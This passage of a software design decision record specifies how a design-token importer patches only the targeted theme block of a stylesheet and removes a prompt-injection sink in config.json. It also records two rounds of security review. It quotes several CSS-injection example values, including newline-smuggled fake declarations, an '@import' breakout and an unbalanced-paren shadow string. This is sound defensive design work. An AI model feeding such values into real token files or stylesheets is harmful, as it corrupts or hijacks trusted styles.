THEME-BLOCK-SCOPED **Round-1 finding, found independently by both reviewers against the real on-disk file shape (security-auditor B2, ethical-hacker F6) — the original draft's "replaces ONLY that declaration's value" model was under-specified against how a real Maude DS file is actually structured.** Every scaffolded DS ships a dark+light theme pair (verified against the real, committed `.design/system/maude/colors_and_type.css`: `--bg-0` is declared once inside `:root, .maude[data-theme="dark"] { … }` and again inside `.maude[data-theme="light"] { … }`) — most target variables are declared **twice**, not once. A single, whole-file `.replace()` patches only whichever block the regex engine finds first (silently leaves the other theme stale); a global `/g` replace writes the SAME single imported value into both the dark and light blocks (a single-valued imported token can't express "dark value" vs "light value" — this actively overwrites one theme with the wrong value). Neither behavior was an acceptable "replaces the declaration" outcome. **Chained with a second, independent finding (security-auditor B3, ethical-hacker F2): a whole-file `m`-flagged regex scan is itself unsafe once Decision 4 allows any value to contain a newline (now closed at the grammar level above) — a value crafted with an embedded `\n--bg-0: red; x` could plant a fake declaration line that a later whole-file `/^--bg-0.../m` patch pass would match INSTEAD of the real declaration, corrupting the trusted stylesheet outside its intended theme block.** The redesign below closes this independently of the Decision 4 newline-reject fix (defense-in-depth, not reliance on a single control): - **Patch mode is THEME-BLOCK-SCOPED, never a whole-file regex.** The importer first locates the text span of the target theme's selector block only. **Round-2 precision fix (ethical-hacker, checked against the real committed file):** the target is a **grouped selector prelude**, not two separate blocks — the real `maude` DS file's dark block is `:root,\n.maude[data-theme="dark"] { … }`, ONE rule whose selector list happens to include both `:root` and `.{rootClass}[data-theme="dark"]`, sharing a single `{`/`}` pair. The locator searches for the `.{rootClass}[data-theme=""]` selector text (tolerant of the whitespace/quote-style variants a hand-edited file might legitimately carry — `[ data-theme = "dark" ]`, `[data-theme='dark']`) — or, when `themeDefault` is the DS's only declared theme (`config.json themes` has length 1) and no `[data-theme]` selector exists at all, the bare `:root` selector, which for a single-theme DS legitimately IS the target — then brace-matches from THAT selector's own opening `{` to find the block's span; it does not treat `:root` and the `[data-theme]` selector as two separate blocks to reconcile. - **Round-2 finding (ethical-hacker): the SAME selector strings recur inside the `@media (prefers-reduced-motion: reduce)` block** (the real file's motion-collapse rule re-lists `:root, .maude[data-theme="dark"], .maude[data-theme="light"]` verbatim). A locator that matches the first occurrence of the target selector text in raw document order is correct only by the accident that the real theme blocks currently precede the `@media` block — fragile against a hand-edited reorder. **The locator therefore explicitly scopes its search to top-level rules only, skipping any selector match found inside an `@media (...)` wrapper** (tracked via the same brace-depth state the tokenizer/locator already carries) — it locates the TOP-LEVEL theme rule specifically, never a `@media`-nested one that happens to share the same selector text. - **The brace-matcher is comment/string-aware, reusing Decision 1's tokenizer state discipline** (track quoted-string and `/* … */` comment state while counting `{`/`}`) rather than naive character counting — a `}` inside a comment or inside a declaration's value (e.g. a `content: "}"`-shaped string, not that this file has one, but the matcher shouldn't assume) must not be allowed to mis-terminate the block span. - All declaration lookup and patching happens **only within the located block's text span** — a value planted with an embedded fake `--name:` line elsewhere in the file (inside a different theme's block, inside a comment, inside another token's value) is structurally unreachable, because the patcher never scans outside the one located, top-level, comment-aware-matched block. - **The failure mode when the target block can't be unambiguously located is a HARD REJECT with a clear "could not locate the `` block in `` — this file's theme structure isn't recognized" error and NO write of any kind** (security-auditor N1, Round 2) — never a fallback to `:root`, to the first (possibly `@media`-nested) match, or to a whole-file scan, any of which would silently reopen a B2/B3-shaped variant of the exact bug this redesign closes. Triggers: a `themeDefault` naming a theme with no matching top-level selector, a theme expressed via `@media (prefers-color-scheme: dark)` instead of `[data-theme]` (a structurally different, out-of-scope-for-v1 mechanism), or a corrupted file whose brace-matching runs to EOF unresolved. This applies even in `--force-insert` mode: force-insert still requires a located block to insert before its closing `}` — it does not fall back to file-scope insertion when no block is found. - **Explicit twin-declaration policy.** A flat, single-valued imported token patches ONLY the located target-theme block. Every OTHER theme block containing the same variable is left untouched and reported in the mapping report as `skipped: themed-token-not-patched (theme=, value unchanged)`. A new `--theme ` CLI flag lets a caller target a specific theme explicitly (default: `config.json themeDefault`) — importing separate light/dark token exports means running the verb twice, once per `--theme`, each a fully independent, correctly-scoped patch pass. - Within the located block, replaces ONLY the matched declaration's value via a targeted, closed-vocabulary line match (operating only on the fixed set of family-prefixed names this DDR's grammar table covers, matched against a **trimmed line start**, not a whole-file `^…$/m` anchor) — mirroring the same "regex over a known, closed vocabulary, not general CSS parsing" house style `design-system-keeper`'s token-usage audit and `handoff.ts`'s `filterTokensCss()` already use for **Maude's own trusted output files** (as opposed to Decision 1's tokenizer choice for the untrusted *input* side). Everything else in the file — comments, structure, un-mapped declarations, the other theme's block, the `@media (prefers-reduced-motion)` block — is left byte-for-byte untouched. - **Force-insert anchor, specified precisely**: `--force-insert` (a token whose target variable has no existing declaration in the located block) inserts the new declaration line immediately before the CLOSING `}` of the SAME located theme-block span used for patching — never at file scope, never "before the last `}` in the file" (which could land in the wrong rule entirely, e.g. the `@media` block). - **Realpath containment**, mirroring DDR-167 Decision 3: the resolved write path must resolve inside `/system/` before any write, independent of what `config.json` claims — defense in depth against a corrupted or malicious `config.json` pointing `tokensCssRel` somewhere unexpected. - **Atomic write**: write to a temp file in the same directory, then `renameSync` over the target — never a partial/truncated file on a crash mid-write, same discipline as the concurrent `stage_bundled_cli_link()` symlink-swap fix elsewhere in this codebase. - **Scaffold mode** (`--new-ds `, no existing DS of that name): reuses the EXISTING `scaffold-design.ts` scaffolding path to create the minimal file skeleton first (same neutral, no-visual-defaults posture as `--no-discovery` mode, DDR-043), then applies the identical theme-block-scoped patch pass from above onto the freshly scaffolded file (both theme blocks exist from the template; only the `--theme`-targeted one is patched, per the policy above). Only this mode touches `config.json` — see Decision 8 for exactly what is and isn't written there. - **Backup**: the pre-patch file content is preserved in the same `_history/_system/` report directory alongside the mapping report (not a `.bak` sibling next to the live file, keeping the working tree clean) — a manual revert path if a heuristic mapping produces an undesired result. ## Decision 8 — CLI-verb reachability: narrower residual than DDR-167 Decision 5, no proof-token gate — but the new-DS metadata sink is ELIMINATED, not merely bounded DDR-167 Decision 5 added an ACP-session-scoped proof-token gate for `import-asset` because that verb writes **arbitrary local file bytes** (an entire document/photo) into the peer-synced `assets/` tree — a high-bandwidth exfiltration channel a prompt-injected agent session could exploit indistinguishably from a legitimate import. `import-tokens` is a **different shape of risk** for the token VALUES themselves: - The only data that can reach the output stylesheet is a value that (a) matched a recognized token-family **name pattern** and (b) passed that family's narrow **value grammar** (Decision 4). This is a low-bandwidth, structurally-typed channel (a handful of numbers, a color, a short font-family string) — categorically smaller than "an entire file's bytes/rendered pages," and specifically NOT capable of carrying arbitrary attacker-chosen text (font-family values are charset-restricted to `[A-Za-z0-9 _-]`, colors are numeric-argument-only, and — after this revision — no grammar contains an unbounded free-text capture). - There is no HTTP route and no in-app panel for this verb (Decision, Instruments header) — the only entry point is the plain CLI, identical in shape to every other `maude design ` today. **Round-1 finding (ethical-hacker F3, HIGH — this revises the original draft's reasoning, not just its wording).** The first draft called the `--new-ds `/description sink "a cosmetic string, low-blast-radius" without tracing where it actually goes. Traced properly: `config.json designSystems[]` is **VERSIONED and peer-synced** (DDR-054's untrusted-peer model, the same runtime-state taxonomy CLAUDE.md documents) AND is **read into context by multiple Maude LLM agents** — `design-system-completeness-critic`, `design-system-keeper`, and the `/design:setup-ds`/`/design:new` flows all read `config.json`. Free text landing there from an unvalidated source is not "cosmetic" — it is a **prompt-injection surface** reaching those agents, cross-peer, which is exactly the class of risk DDR-167 itself quarantined behind an explicit DDR gate (the plan's T12a) rather than accepting inline. Calling it cosmetic without tracing the sinks was the error, not the underlying architecture. **Fix: eliminate the sink rather than bound it.** - **The imported token file's content NEVER supplies the DS description.** No `$description`/metadata/comment field read from the input token file is written into `config.json` under any circumstance — there is no code path from "text found in the parsed token file" to "text written into `designSystems[].description`." The importer always writes a **fixed, importer-authored template string** for a scaffolded DS's description (e.g. `"Imported via maude design import-tokens — tokens mapped on . Refine via /design:setup-ds."`, with only the token COUNT and a server-generated date as the two non-literal parts, both numeric/date values, not free text). A user who wants a real, considered description sets one afterward via the existing `/design:setup-ds` flow, which already has its own, separate, human-typed-CLI-arg trust model. - **`--new-ds ` is charset-constrained to `^[a-z0-9-]{1,64}$`, asserted before it touches the filesystem path, the `system//` directory name, or `config.json`.** This closes the separate concern (ethical-hacker F3's second half) that the name string also flows into path-adjacent and name-keyed lookups elsewhere in the codebase (the server's `canvasDesignSystems` map, `meta.designSystem` references) beyond just `config.json` — a name outside this charset is a hard reject (`rejected: invalid-ds-name`), not sanitized-and-accepted. The SAME charset-validated name (never a second, unvalidated copy) is what's forwarded to `scaffold-design.ts` and into any generated file — closing the adjacent question (raised independently by a second ethical-hacker pass against the pre-revision draft) of whether an unescaped name could break out of a CSS comment or a JSON string somewhere downstream: the kebab-case-only charset contains no `*/`, `"`, `` ` ``, `{`, or `}`, so there is no character available to attempt a breakout with, regardless of how downstream code interpolates it. - **`import-tokens.sh` (the bash wrapper) quotes every argument it forwards** (`"$@"`/individually-quoted positional args, never an unquoted or `eval`-expanded interpolation) — mirroring every other `maude design ` wrapper in this codebase. This is a wrapper-hygiene requirement stated explicitly here (rather than left to be "obviously" done right) because `--new-ds ` is exactly the kind of caller-supplied argv value a careless wrapper could mishandle; the charset validation above happens in `_import-tokens.mjs`, not the shell wrapper, so the wrapper's OWN job is limited to safe argv passthrough, not validation. - **`config.json`'s write (scaffold mode only) is realpath-contained to the single, exact expected path `/config.json`** — a narrower assertion than the CSS write's "resolves inside `/system/`" (there is exactly one legitimate config.json location, not a subtree), stated explicitly rather than left implicit under the `system/`-scoped bullet above, which does not cover this second write target. - With both of those closed, the ONLY new-DS-mode data reaching `config.json` from this verb is: the charset-validated name, a fixed description template with a numeric count, and the `tokensCssRel`/`rootClass`/`themes` structural fields the scaffold path already derives from `scaffold-design.ts` (not from the input file). There is no remaining free-text sink to name as a residual — the fix is structural elimination, not a bound. - **Read-side note (security-auditor completeness note), stated explicitly rather than left implicit**: this verb still reads an arbitrary local path in an ACP-reachable CLI and emits a mapping report enumerating parsed token paths/values. This grants no NEW capability beyond what a file-reading agent already has (the same DDR-164 §F3 structural-residual logic DDR-167 itself relies on for reads) — but the report is written under `/_history/_system/` (gitignored runtime state per the taxonomy) and Decision 1's parse-error messages never echo raw input content, so no new echo-back exfil channel is added either. - If a future revision of this feature adds an HTTP route or an in-app panel (mirroring T10's Brand-upload panel), THAT change must re-derive this decision — the "narrower than DDR-167" reasoning is specific to the CLI-only, value-grammar-bounded, metadata-sink-eliminated shape this DDR describes now. ## Threat model summary | Threat | Closed by | | --- | --- | | CSS injection via token value (rule termination, `@import`, `url()`, `expression()`) reaching a live-rendered stylesheet | Per-family value-grammar allowlist, closed under composition, no unbounded free-text captures, shadow-layer grammar fixed to strict-numeric-only (Decision 4) | | Grammar bypass via multiline value + `/m`-anchored matching (`#fff\n};@import url(…)`) | Newline/control-char hard-reject before grammar matching; the one free-text sink DDR-167's own review pattern would flag (new-DS metadata) is eliminated above rather than merely bounded; no technical gate added (Decision 8) | ## Consequences - Net-new parsing/mapping/validation code (`_import-tokens.mjs`) needs test coverage across all three input formats plus the negative cases in the threat table above (a CSS-injection-shaped value incl. the multiline/`/m` bypass and the shadow-grammar unbalanced-paren case, a cyclic alias, a multi-reference-interpolation value, a `__proto__`-keyed object, a deeply-nested-array object, an oversized file, a malformed JSON/CSS file, a dual-theme patch run, a pathological numeric magnitude, and a theme-block-not-found rejection). The Decision 1 tokenizer specifically needs fixtures for both quote styles, a quote of one style nested inside the other (must stay a literal, not a string-start), and escaped terminators (`\;`, `\}`) inside a value — the exact shapes a state-tracking-but-untested tokenizer is most likely to get subtly wrong (security-auditor N4). - No new npm dependency. JSON formats use native `JSON.parse`; the raw-CSS input format uses a small hand-written tokenizer instead of `lightningcss` (deliberately NOT reused here — see Decision 1's Round-1 revision) or a regex. - One small, low-risk addition to `apps/studio/draw/palette.ts` (`rgbToOklch`) — pure function, same file/style as its existing inverse. - The value-grammar table (Decision 4) is the single control this DDR treats as load-bearing; any future change that adds a new target CSS-variable family (e.g. a new token kind) MUST add a corresponding grammar row here — with both a shape AND a magnitude bound, and no unbounded free-text capture — before the importer is allowed to write to it. An ungoverned family is a `skipped`, not a silent pass-through. - Colorspace conversion coverage (hsl/lab → oklch) is an explicitly named gap, not silently absorbed — a reasonable, low-priority follow-up. - Two permanent regression-test requirements, not optional hardening: (1) the resolver-module import-ban test (Decision 2), (2) the theme-block-scoped patch tested against a real dual-theme fixture (dark+light both present, only the targeted one changes). ## Security review **Round 1 (2026-07-14) — design-stage, against the initial draft.** `security-auditor` (defender) + `ethical-hacker` (adversarial) both reviewed the DDR text (no code existed yet). **security-auditor — 3 blockers, 6 warnings:** 1. (Blocker) `--shadow-*` grammar's `[^)]+` layer falsified the DDR's own closure invariant → every layer now uses the strict numeric-only rgba grammar (Decision 4). 2. (Blocker) Patch model didn't account for real dual-theme (dark+light) declarations, confirmed against the actual committed `maude` DS file → theme-block-scoped patch + explicit twin-declaration policy (Decision 7). 3. (Blocker) Newline-bearing grammar-valid values + `/m`-anchored whole-file patch regex chain into a cross-token patch hijack → theme-block scoping + independent newline-reject at the grammar layer, two closures (Decision 4 + 7). 4. (Warning) Alias depth-cap doesn't bound branching fan-out → whole-value-only alias resolution removes the fan-out term structurally (Decision 2). 5. (Warning) New-DS name/description residual under-argued, sinks not enumerated → sink eliminated (fixed template, charset-constrained name), not just re-argued (Decision 8). 6. (Warning) No numeric magnitude bound on grammar-valid values → magnitude ranges added to every numeric grammar (Decision 4). 7. (Warning) No structural depth cap on the JSON tree-walk, separate from alias depth → explicit 32-level cap (Decision 3). 8. (Warning) `lightningcss` runtime availability in the compiled `bun --compile` binary unverified → dropped in favor of a small dependency-free tokenizer (Decision 1). 9. (Warning) Input read lacked DDR-167's realpath/symlink/single-read discipline → added, mirrored from DDR-167 Decision 2 step 1 (Decision 1). **ethical-hacker — 2 HIGH, 3 MEDIUM, 1 LOW, all with concrete PoCs or precise mechanisms where applicable:** 1. (HIGH) Constructed a concrete shadow-grammar bypass string (`0px 0px rgba(0,0,0), 0px 0px rgba(0(0)`) producing an unbalanced paren in the live stylesheet → same fix as security-auditor's B1, independently confirmed with a working PoC (Decision 4). 2. (HIGH) New-DS metadata reasoning was wrong, not just under-argued — traced the actual sinks (`config.json` is read by multiple LLM agents + peer-synced) and re-rated it a genuine prompt-injection surface → sink eliminated (Decision 8). 3. (Medium) Newline + `/m` grammar bypass, precise mechanism shown → independent newline-reject closure (Decision 4). 4. (Medium) "Resolver never dereferences a path" was prose-only, no enforcement → permanent import-ban test added (Decision 2). 5. (Medium, conditional) Multi-reference interpolation billion-laughs analogue named as a real, distinct mechanism from the branching-fanout finding → closed by the same whole-value-only structural restriction (Decision 2). 6. (Low) Confirmed the twin-declaration bug independently, plus flagged the unspecified force-insert anchor → theme-block scoping + precise anchor spec (Decision 7). Also explicitly attempted and could NOT break: Decision 3's prototype-pollution guard, the Decision 7 declaration-name regex-injection angle (closed vocabulary, no metacharacters), Decision 5's mis-mapping-not-privilege-escalation bound, and realpath containment + atomic write — recorded so these aren't re-litigated in Round 2. **Net result of Round 1:** every finding from both reviewers has a concrete closure in the revision above — none left as vague reassurance. The `--shadow-*` grammar fix and the theme-block-scoped patch redesign are the two substantial mechanism changes; everything else is a bounded, additive control. **A second, independent `ethical-hacker` pass** ran concurrently against the pre-revision draft (an accidental duplicate spawn) and independently rediscovered the shadow-grammar bypass, the alias-fan-out billion-laughs analogue, and the structural-recursion-depth gap — useful convergent confirmation that these were real, not reviewer-specific findings, and all three are already closed above. It contributed two items not previously raised, both folded into Decision 8: (1) `import-tokens.sh` must quote every forwarded argument, stated explicitly rather than assumed; (2) the `config.json` scaffold-mode write needed its OWN realpath-containment statement (pinned to the single exact path, not the `system/`-scoped assertion that only covers the CSS write). Its remaining findings (new-DS metadata escaping, the `lightningcss` native-parser framing) were superseded by the Decision 1 and Decision 8 rewrites above before this pass reported. **Round 2 (2026-07-14) — confirmation pass against the Round-1 revision, not a fresh discovery pass.** Both reviewers verified each Round-1 fix against the actual revised Decision text. **security-auditor Round 2 — all 3 blockers + all 6 warnings + all 4 completeness notes RESOLVED**, verified individually against the revised text (the shadow grammar's balanced-paren property specifically re-checked, the theme-block mechanism checked against the real committed file's grouped-selector shape). One new warning (N1: the theme-block-locate step had no defined failure mode) plus three minor items (N2: a stray reference to Decision 7 "needing" `/m`, which it doesn't; N3: `\s` in the grammars admitting non-space whitespace; N4: tokenizer test-fixture specificity) — all four closed in this revision (N1 → explicit hard-reject-no-write failure mode + single-theme `:root` clarification; N2 → removed, restated as an unconditional invariant; N3 → grammars use a literal space, not `\s`; N4 → explicit fixture list added to Consequences). **ethical-hacker Round 2 — all 6 Round-1 findings (including both HIGHs) RESOLVED**, including a direct re-attack on the fixed shadow grammar (could not reconstruct a bypass — parens are now strictly balanced per layer) and a structural trace of the whole-value-only alias restriction through a nested multi-ref case (confirmed no expansion at any depth). Four new LOW/LOW-MED residuals, all closed in this revision: (1) the C0-only control-char reject missed JS's full `LineTerminator` set (U+2028/U+2029) — superseded by a stronger, simpler printable-ASCII-only (`0x20`–`0x7E`) pre-filter that subsumes it; (2) the `--new-ds` charset check didn't visibly carry the same anti-`/m`/full-string-match discipline as Decision 4 — now stated as the identical rule, explicitly tied together; (3) the resolver import-ban test's coverage list missed unprefixed specifiers (`fs` vs `node:fs`) and `child_process`/`dns` — broadened; (4) the theme-block locator's prose implied `:root` and `.{rootClass}[data-theme]` were two separate blocks (they're one grouped selector prelude) and didn't account for the `@media (prefers-reduced-motion)` block repeating the identical selector strings — locator description corrected to match the real file's shape and scoped to top-level (non-`@media`-nested) matches only, plus a comment/string-aware brace-matcher requirement reusing Decision 1's tokenizer state discipline. A third, independent `ethical-hacker` pass (an accidental duplicate spawn, reviewing the pre-revision draft) converged on the same core findings and contributed two additional items folded into Decision 8 during Round 1 revision: bash-wrapper argument-quoting hygiene and a `config.json`-specific realpath-containment statement (see the paragraph above). **Net result:** every Round-1 AND Round-2 finding from all reviewer passes now has a concrete, specific technical closure in this document — none left as vague reassurance. The two substantial mechanism changes (the shadow-grammar fix and the theme-block-scoped, `@media`-aware, comment-aware patch redesign) were independently re-attacked in Round 2 and held. Status flips to Accepted on that basis, matching the DDR-167 precedent of a two-round design-stage review before any code lands. **Post-implementation confirmation (2026-07-14) — security-auditor re-reviewed this DECISION TEXT against the shipped code after T11 implementation completed.** Verdict: **security-clean, no hold** — every N1–N3 Round-2 item re-verified correct (theme-block-locate failure mode, the `/m`-inconsistency fix, the literal-space invariant). Two DOCUMENTATION-DRIFT findings, both against the DDR's own prose text, not the shipped code: (1) the rgba/shadow inter-argument separator in this document's grammar table showed `[ ,]` (exactly one char) where the actually-implemented and tested code uses `[ ,]+` (one-or-more) — the single-char form would spuriously reject the common `rgba(0, 0, 0, 0.5)` comma-space format, which is exactly the bug T11's own test suite caught and fixed DURING implementation (`accepts a real multi-layer shadow value`, `accepts valid hex/oklch/rgb/hsl colors` in `import-tokens.test.ts`) — the code was already correct, only this document's transcription had drifted; (2) the `--ease-*` row showed `\s?` where the shipped `CUBIC_BEZIER_RE` already uses a literal ` ?` — again code-correct, doc-stale. Both are now reconciled to match the shipped, tested `_import-tokens.mjs` exactly (verified live post-fix: `rgba(0, 0, 0, 0.5)`, `0 1px 2px rgba(0, 0, 0, 0.4)`, and `cubic-bezier(0.2, 0, 0, 1)` all validate `ok: true`). No code changes were needed — this was purely bringing the DDR's own prose back into sync with what already shipped, the exact "prose vs. reality drift" class this project's own conventions (and this DDR's own Decision 2 permanent-test requirement) exist to prevent.
